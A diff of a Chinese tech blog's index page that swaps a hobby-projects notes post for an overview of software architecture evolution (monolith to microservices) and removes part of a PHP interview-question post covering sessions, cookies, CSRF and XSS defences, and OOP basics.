@@ -184,8 +184,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/pc/">
-                PC Room
+            <a href="/2025/05/28/software-structure/">
+                软件架构演变
             </a>
         </h1>
         <div class="post-info">
@@ -195,7 +195,7 @@
             
             
                 <span class="category">
-                    <a href="/categories/新/">新</a>
+                    <a href="/categories/架构/">架构</a>
                 </span>
             
         </div>
@@ -203,162 +203,70 @@
 
     
         <div class="content">
-            <p>需要技术</p>
-<p>macbook 不适合做AI</p>
-<h2 id="云操作系统"><a href="#云操作系统" class="headerlink" title="云操作系统"></a>云操作系统</h2><h3 id="Raspberry-Pi"><a href="#Raspberry-Pi" class="headerlink" title="Raspberry Pi"></a>Raspberry Pi</h3><p><a target="_blank" rel="noopener" href="https://github.com/labring/sealos">集群 使用文件管理器Sealos k8s</a><br><a target="_blank" rel="noopener" href="https://sealos.io/">Sealos</a><br><a target="_blank" rel="noopener" href="https://sealos.io/">文件管理器 - casaOS</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">Raspberry Pi Zero W P4wnP1 A.L.O.A</a></p>
-<h2 id="升降桌DIY"><a href="#升降桌DIY" class="headerlink" title="升降桌DIY"></a>升降桌DIY</h2><p>铝型材 DIY</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qJHTefE5e/?share_source=copy_web">【DIY双层升降桌！一张桌子却有两张桌面？？】</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1cL4y1T7fC/?share_source=copy_web">【做工具】 自从有了“多功能电动升降桌”再也不用爬梯子🪜了 转自Kynosys Inventor WoodWorker</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1oWiiYfEkX/?share_source=copy_web">详细教程和材料清单】DIYer的梦中情桌！我做的：双层铝型材电动升降桌 升级版！正装结构更稳！不用切割，上手更简单！你确定不做一张吗？</a></p>
-<h2 id="音箱DIY"><a href="#音箱DIY" class="headerlink" title="音箱DIY"></a>音箱DIY</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VvFrecEww/?share_source=copy_web">1.5寸便携小音箱 -3D打印DIY-</a></p>
-<p>音箱 是由喇叭决定的和箱子提及无关</p>
-<h2 id="个人语音助手"><a href="#个人语音助手" class="headerlink" title="个人语音助手"></a>个人语音助手</h2><h3 id="语音验证"><a href="#语音验证" class="headerlink" title="语音验证"></a>语音验证</h3><table>
-<thead>
-<tr>
-<th>方案</th>
-<th>方法</th>
-<th>优点</th>
-<th>适用场景</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Vosk + X-vector</strong></td>
-<td>离线语音验证</td>
-<td>轻量级，树莓派可运行</td>
-<td>本地语音助手</td>
-</tr>
-<tr>
-<td><strong>DeepSpeaker (D-vector)</strong></td>
-<td>深度学习模型</td>
-<td>高准确率</td>
-<td>复杂应用，如智能门禁</td>
-</tr>
-<tr>
-<td><strong>ECAPA-TDNN</strong></td>
-<td>SOTA 声纹识别</td>
-<td>最新算法，高精度</td>
-<td>多用户识别</td>
-</tr>
-</tbody></table>
-<h3 id="语音唤醒-（Wake-Word-Detection）"><a href="#语音唤醒-（Wake-Word-Detection）" class="headerlink" title="语音唤醒 （Wake Word Detection）"></a>语音唤醒 （Wake Word Detection）</h3><ul>
-<li>需要一个始终在监听的“唤醒词”（如 Siri 监听“Hey Siri”）。</li>
-<li>解决方案：<ul>
-<li>Porcupine（轻量级，支持离线）</li>
-<li>Snowboy（不再维护，但仍可用）</li>
-<li>Mycroft Precise（开源，可训练自定义唤醒词）</li>
+            <h2 id="前端了解"><a href="#前端了解" class="headerlink" title="前端了解"></a>前端了解</h2><p>浏览器基本内核：</p>
+<ul>
+<li>IE(7,8,9,10 这几个版本难以兼容) -&gt; Trident内核 （目前淘汰）</li>
+<li>Chrome: Webkit内核 -&gt; Blink内核</li>
+<li>火狐: Gecko内核</li>
+<li>Safari: Webkit内核</li>
+<li>Opera: Presto -&gt; Webkit内核 -&gt; Blink内核</li>
 </ul>
-</li>
+<h2 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h2><p>在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。</p>
+<p><img src="/images/single-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
+<ul>
+<li>开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力</li>
+<li>开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程</li>
 </ul>
-<h3 id="自然语言理解（Natural-Language-Understanding-NLU）"><a href="#自然语言理解（Natural-Language-Understanding-NLU）" class="headerlink" title="自然语言理解（Natural Language Understanding, NLU）"></a>自然语言理解（Natural Language Understanding, NLU）</h3><ul>
-<li>解析用户的意图，比如“今天天气怎么样？” → 解析出“查询天气”。</li>
-<li>方案：<ul>
-<li>Rasa NLU（开源，可离线运行）</li>
-<li>Snips NLU（轻量级，但 Snips 已被 Sonos 收购）</li>
-<li>OpenAI GPT-4（需要联网，但效果强大）</li>
+<p><em><strong>缺点:</strong></em></p>
+<ul>
+<li>系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险</li>
+<li>单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题</li>
 </ul>
-</li>
+<p><em><strong>基本框架：</strong></em></p>
+<ul>
+<li>前端 - angular jq 模版引擎ecshop(smart)</li>
+<li>后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)</li>
 </ul>
-<h3 id="步骤流程"><a href="#步骤流程" class="headerlink" title="步骤流程"></a>步骤流程</h3><p>[麦克风输入]<br>      ↓<br>[Ring Buffer 缓存]<br>      ↓<br>[唤醒词检测]（Porcupine &#x2F; Precise &#x2F; Vosk+KeywordSpotter）<br>      ↓（匹配成功）<br>[提取音频片段]（如1~2秒）<br>      ↓<br>[X-vector 说话人识别]<br>      ↓<br>[身份确认后 → 激活系统 &#x2F; 否则忽略]<br>      ↓<br>[完整语音识别（ASR）: Vosk]</p>
-<h2 id="投影仪"><a href="#投影仪" class="headerlink" title="投影仪"></a>投影仪</h2><p>3k<br>坚果呢n1s </p>
-<h2 id="PBC"><a href="#PBC" class="headerlink" title="PBC"></a>PBC</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gitblog_01050/article/details/141013419">制作PBC板</a></p>
-<h2 id="3d打印"><a href="#3d打印" class="headerlink" title="3d打印"></a>3d打印</h2><p><a target="_blank" rel="noopener" href="https://makerworld.com/zh/models/1013711?from=search#profileId-993508">GP02A半身像1</a><br><a target="_blank" rel="noopener" href="https://makerworld.com/zh/models/1013735#profileId-993524">GP02A半身像2</a></p>
-
-
-	<div class="row">
-    <embed src="/pdf/GP02A_Assembly_Guide.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-<p><a target="_blank" rel="noopener" href="https://www.aigei.com/item/3d_da_yin_gao_d.html">3D打印高达模型 06-飞翼</a></p>
-<p>开放itx机架</p>
-<h3 id="3d建模"><a href="#3d建模" class="headerlink" title="3d建模"></a>3d建模</h3><p>deepseek<br>即梦AI<br>tripo ai</p>
-<h3 id="光固化"><a href="#光固化" class="headerlink" title="光固化"></a>光固化</h3><table>
-<thead>
-<tr>
-<th><strong>类别</strong></th>
-<th><strong>项目</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>🖨️ <strong>主要设备</strong></td>
-<td>光固化 3D 打印机 (SLA&#x2F;DLP&#x2F;LCD)</td>
-</tr>
-<tr>
-<td></td>
-<td>紫外固化灯箱 (UV Curing Box)</td>
-</tr>
-<tr>
-<td></td>
-<td>清洗设备 (超声波清洗机、清洗桶)</td>
-</tr>
-<tr>
-<td>🧴 <strong>材料与消耗品</strong></td>
-<td>光敏树脂 (标准树脂、柔性树脂、透明树脂、铸造树脂等)</td>
-</tr>
-<tr>
-<td></td>
-<td>FEP 膜 (需定期更换)</td>
-</tr>
-<tr>
-<td></td>
-<td>树脂槽 (Resin Vat)</td>
-</tr>
-<tr>
-<td></td>
-<td>打印平台 (Build Plate)</td>
-</tr>
-<tr>
-<td>🔧 <strong>后处理工具</strong></td>
-<td>清洗液 (IPA 异丙醇)</td>
-</tr>
-<tr>
-<td></td>
-<td>刷子、刮刀、镊子、钳子</td>
-</tr>
-<tr>
-<td></td>
-<td>砂纸、打磨工具、模型修补工具</td>
-</tr>
-<tr>
-<td>🛠️ <strong>维护配件</strong></td>
-<td>备用 LCD 屏、UV 灯、Z 轴润滑剂</td>
-</tr>
-<tr>
-<td></td>
-<td>备用 FEP 膜、备用树脂槽</td>
-</tr>
-<tr>
-<td></td>
-<td>风扇或过滤装置 (提升安全性和打印环境)</td>
-</tr>
-<tr>
-<td>🧰 <strong>安全设备与工具</strong></td>
-<td>一次性手套、护目镜、口罩</td>
-</tr>
-<tr>
-<td></td>
-<td>模型支撑移除工具、模型表面修复工具</td>
-</tr>
-<tr>
-<td>💡 <strong>软件与数字工具</strong></td>
-<td>切片软件 (Chitubox、Lychee、PrusaSlicer)</td>
-</tr>
-<tr>
-<td></td>
-<td>3D 建模软件 (Blender、ZBrush、Fusion 360)</td>
-</tr>
-<tr>
-<td></td>
-<td>打印机固件和控制软件 (如 OctoPrint)</td>
-</tr>
-</tbody></table>
-<h4 id="珠宝"><a href="#珠宝" class="headerlink" title="珠宝"></a>珠宝</h4><p>光敏铸造树脂<br>种蜡树<br>倒石膏<br>然后铸造</p>
-<h2 id="Flipper-Zero"><a href="#Flipper-Zero" class="headerlink" title="Flipper Zero"></a>Flipper Zero</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/385317.html">Flipper Zero 入门到升华（一）</a></p>
-<h2 id="esp8266"><a href="#esp8266" class="headerlink" title="esp8266"></a>esp8266</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p><a target="_blank" rel="noopener" href="https://help.jimureport.com/">大屏幕</a></p>
-<h3 id="vpn-服务"><a href="#vpn-服务" class="headerlink" title="vpn 服务"></a>vpn 服务</h3><p>WireGuard Dashboard<br>WireGuard-UI 安装和配置</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/WireGuard/wireguard-go">https://github.com/WireGuard/wireguard-go</a></p>
+<h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。</p>
+<p>多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。</p>
+<p><img src="/images/mult-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
+<ul>
+<li>尽管层与层之间的耦合较单体架构有所减少<br><em><strong>缺点:</strong></em></li>
+<li>某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。</li>
+</ul>
+<p>一般会采用敏捷开发杜绝此类现象，产品周期性迭代<br>逐渐有了devops的概念</p>
+<h3 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h3><p><img src="/images/rw-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p>
+<p><em><strong>解决方案：读写分离</strong></em><br>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离</p>
+<p>有了锁的概念 读写锁 乐观锁 悲观锁 </p>
+<h3 id="用消息队列的架构"><a href="#用消息队列的架构" class="headerlink" title="用消息队列的架构"></a>用消息队列的架构</h3><p><img src="/images/rw-cache-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。</p>
+<p><em><strong>解决方案：消息队列</strong></em><br>我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。<br>随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p>
+<h3 id="过度阶段-面向服务的架构SOA"><a href="#过度阶段-面向服务的架构SOA" class="headerlink" title="过度阶段 面向服务的架构SOA"></a>过度阶段 面向服务的架构SOA</h3><p><em><strong>原因：</strong></em><br>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p>
+<p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p>
+<p><img src="/images/SSO-software-structure.png"></p>
+<p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p>
+<p><img src="/images/OAuth-software-structure.png"></p>
+<p>通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p>
+<h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。</p>
+<p>微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。</p>
+<p><img src="/images/micro-software-structure.png"></p>
+<p>不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p>
+<p>将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p>
+<p>优点:</p>
+<ul>
+<li>它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。</li>
+<li>微服务架构通过服务之间的松耦合，提高了系统的可靠性</li>
+<li>每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。</li>
+</ul>
+<p>缺点: </p>
+<ul>
+<li>相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大</li>
+<li>微服务架构需要更多的工作量来设计、开发、测试、部署和管理多个小型服务，这增加了开发团队的负担 成本高</li>
+</ul>
+<h2 id="边缘计算架构"><a href="#边缘计算架构" class="headerlink" title="边缘计算架构"></a>边缘计算架构</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7368505674224238607">引用</a><br><a target="_blank" rel="noopener" href="https://shaogefenhao.com/posts/architecture/roamap-of-system.html#%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84-soa">引用</a></p>
 
         </div>
     
@@ -370,445 +278,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/php-interview/">
-                PHP 面试题
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2025-05-28</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/面试/">面试</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <ul>
-<li><a href="#1">PHP</a><ul>
-<li><a href="#1.1">运行模式</a></li>
-<li><a href="#1.2">Nginx与Apache解析php文件</a></li>
-<li><a href="#1.3">设计模式</a></li>
-<li><a href="#1.4">Session与Cookie</a></li>
-<li><a href="#1.5">闭包</a></li>
-<li><a href="#1.6">单双引号区别</a></li>
-<li><a href="#1.7">include和require的区别</a></li>
-</ul>
-</li>
-<li><a href="#2">PHP优化与高并发</a><ul>
-<li><a href="#2.1">优化方案</a></li>
-<li><a href="#2.2">PSR-4代码规范</a></li>
-<li><a href="#2.3">微服务</a></li>
-<li><a href="#2.4">抽象类与接口区别</a></li>
-<li><a href="#2.5">垃圾回收机制</a></li>
-<li><a href="#2.6">高并发优化</a></li>
-</ul>
-</li>
-<li><a href="#3">Mysql</a><ul>
-<li><a href="#3.1">myisam和innodb区别以及事务四大特性</a></li>
-<li><a href="#3.2">mysql索引</a></li>
-<li><a href="#3.3">主从-分库分表-锁</a></li>
-<li><a href="#3.4">如何定位慢查询</a></li>
-</ul>
-</li>
-<li><a href="#4">MongoDB</a> </li>
-<li><a href="#5">Redis</a><ul>
-<li><a href="#5.1">Redis和Memcache区别</a></li>
-<li><a href="#5.2">Redis常见数据结构</a></li>
-<li><a href="#5.3">Redis缓存雪崩、缓存穿透、缓存击穿</a></li>
-<li><a href="#5.4">Redis淘汰策略</a> </li>
-<li><a href="#5.5">Redis分布式锁怎么实现</a></li>
-<li><a href="#5.6">Redis的持久化机制:RDB-vs-AOF</a></li>
-<li><a href="#5.7">Redis主从哨兵和集群的区别</a></li>
-<li><a href="#5.8">节点扩容不同</a></li>
-</ul>
-</li>
-<li><a href="#6">MQ</a><ul>
-<li><a href="#6.1">RabbitMQ,RocketMQ,Kafka区别</a></li>
-</ul>
-</li>
-<li><a href="#7">服务器&amp;其它方面</a>  <ul>
-<li><a href="#7.1">swoole</a></li>
-<li><a href="#7.2">phpunit</a></li>
-<li><a href="#7.3">php-cs-fixer</a></li>
-<li><a href="#7.4">docker多版本启动共用</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="php面试题"><a href="#php面试题" class="headerlink" title="php面试题"></a>php面试题</h2><h3 id="1">PHP</h3>
-<h4 id="1.1">运行模式</h4>
-
-
-<ul>
-<li>CGI（通用网关接口&#x2F; Common Gateway Interface）</li>
-<li>FastCGI（常驻型CGI &#x2F; Long-Live CGI）lamp</li>
-<li>CLI（命令行运行 &#x2F; Command Line Interface）</li>
-<li>Web模块模式（Apache等Web服务器运行的模式）</li>
-<li>ISAPI（Internet Server Application Program Interface）</li>
-</ul>
-<h4 id="1.2">Nginx与Apache解析php文件</h4>
-
-<ul>
-<li>php是apache的一个模块，必须依靠web服务器才可以运行，在php引擎解析php文件，php引擎将html页面带给web服务器解析并返回客户端</li>
-<li>cgi与fastcgi协议，CGI common gateway interface, CGI缺点，每处理一个请求都要fork一个全新的进程，就有了fastCGI，一个进程内可以处理多个请求</li>
-<li>phpCGI是fastCGI管理器，后面就用了FPM已经集成到了php里(php-fpm进程管理)</li>
-<li>php-fpm监听的事socket文件，nginx通过location将所有php文件交给fpm处理</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">default.conf</span><br><span class="line">location ~ |.php<span class="variable">$&#123;</span></span><br><span class="line"><span class="variable">	include fastcgi_params</span></span><br><span class="line"><span class="variable">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1.3"><a rel="https://refactoringguru.cn/design-patterns/php">设计模式（三大类）</a></h4>
-
-<ul>
-<li>创建型模式共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。</li>
-<li>结构型模式共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</li>
-<li>行为型模式共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式</li>
-</ul>
-<h4 id="1.4">Session与Cookie</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cookie 客户端，保存用户信息的一种机制，</span><br><span class="line">Session 服务端，跟踪用户状态，保存用户会话</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效期上不同</span></span><br><span class="line">Cookie  开发可以通过设置cookie的属性，达到使cookie长期有效的效果。</span><br><span class="line">Session  session依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为-1，只需关闭窗口该session就会失效，因而session不能达到长期有效的效果</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跨域</span></span><br><span class="line">cookie 支持跨域名访问。</span><br><span class="line">session 不支持跨域名访问。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 什么是CSRF攻击，XSS攻击</span></span><br><span class="line">CSRF （Cross-site request forgery）跨站请求伪造,黑客建立一个伪造网站或发送邮箱带了一个正常URL链接来让正常用户访问，来让正常用户让自己浏览器里的COOKIE权限来执行一些非法请求，</span><br><span class="line">如转账，提权等操作</span><br><span class="line">!! 防范方法有，验证 HTTP Referer 字段；在请求地址中添加 token 并验证</span><br><span class="line"></span><br><span class="line">XSS 主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了</span><br><span class="line">!! 防范方法:通过过滤是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.5">闭包</h4>
-内部函数可以访问外部函数
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>() &#123;</span><br><span class="line">  var name = <span class="string">&quot;Mozilla&quot;</span>; // name 是一个被 init 创建的局部变量</span><br><span class="line">  <span class="keyword">function</span> <span class="function"><span class="title">displayName</span></span>() &#123;</span><br><span class="line">    // displayName() 是内部函数，一个闭包</span><br><span class="line">    alert(name); // 使用了父函数中声明的变量</span><br><span class="line">  &#125;</span><br><span class="line">  displayName();</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.6">双引号和单引号的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“<span class="variable">$aaa</span>” 解释变量</span><br><span class="line">‘<span class="variable">$ccc</span>’ 不解释变量</span><br></pre></td></tr></table></figure>
-<h4 id="1.7">include和require的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require 首先执行，报错会终止程序</span><br><span class="line">include 如果包含的，报错会提示，继续执行下去</span><br></pre></td></tr></table></figure>
-<h3 id="2">PHP优化与高并发</h3>
-<h4 id="2.1">优化方案</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">unset</span>(); <span class="comment"># 注销那些不用的变量尤其是大数组，以便释放内存</span></span><br><span class="line">2. str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍</span><br><span class="line">3. 尽量不要在<span class="keyword">for</span>循环中使用函数，比如<span class="keyword">for</span> (<span class="variable">$x</span>=0; <span class="variable">$x</span> &lt; count(<span class="variable">$array</span>); <span class="variable">$x</span>)每循环一次都会调用count()函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.2">PSR-4代码规范</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">composer如何实现？PSR-4是什么?</span><br><span class="line">1. 自动加载有两种方式（都是php内置的），一种是通过__autoload(),另一种是通过spl_autoload_register()。</span><br><span class="line"></span><br><span class="line">2.PSR是PHP Standards Recommendation的简称,制定的代码规范，简称PSR，是代码开发的事实标准</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.3">抽象类与接口区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>抽象类</th>
-<th>接口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>用于声明某一种事物，规范名称、参数，形成模块，未有详细的实现细节</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>通过类来实现相关的细节工作</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>抽象类的抽象方法与接口一样</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>可继承</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>有属性、普通方法、抽象方法</td>
-<td>✅</td>
-<td>❌只有常量</td>
-</tr>
-<tr>
-<td>抽象方法</td>
-<td>❌不一定要有抽象方法</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>语法不同</td>
-<td>❌</td>
-<td>❌</td>
-</tr>
-<tr>
-<td>声明不同</td>
-<td>abstract关键字在类前声明，且有class声明为类</td>
-<td>用interface来声明，但不能用class来声明</td>
-</tr>
-<tr>
-<td>继承</td>
-<td>extends关键字让子类继承父类后，在子类实现详细的抽象方法</td>
-<td>用implements让普通类在类里实现接口的详细方法，且接口可以一次性实现多个方法，用逗号分开各个接口就可</td>
-</tr>
-</tbody></table>
-<p>抽象类与接口的结合</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">写此程序源于自己的猜测，想在抽象类里实现某一接口。 </span><br><span class="line">*/ </span><br><span class="line">interface work&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">abstract class a implements work&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">showlove</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;love you&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;hello, i m in b&#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=new b(); </span><br><span class="line"><span class="variable">$k</span>- say();</span><br><span class="line">/* </span><br><span class="line">以上程序能正常执行</span><br><span class="line">普通类implements接口后，就变成了抽象类了，这就好像是直接给抽象类增加了一个抽象方法。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-
-<p>接口与继承的结合</p>
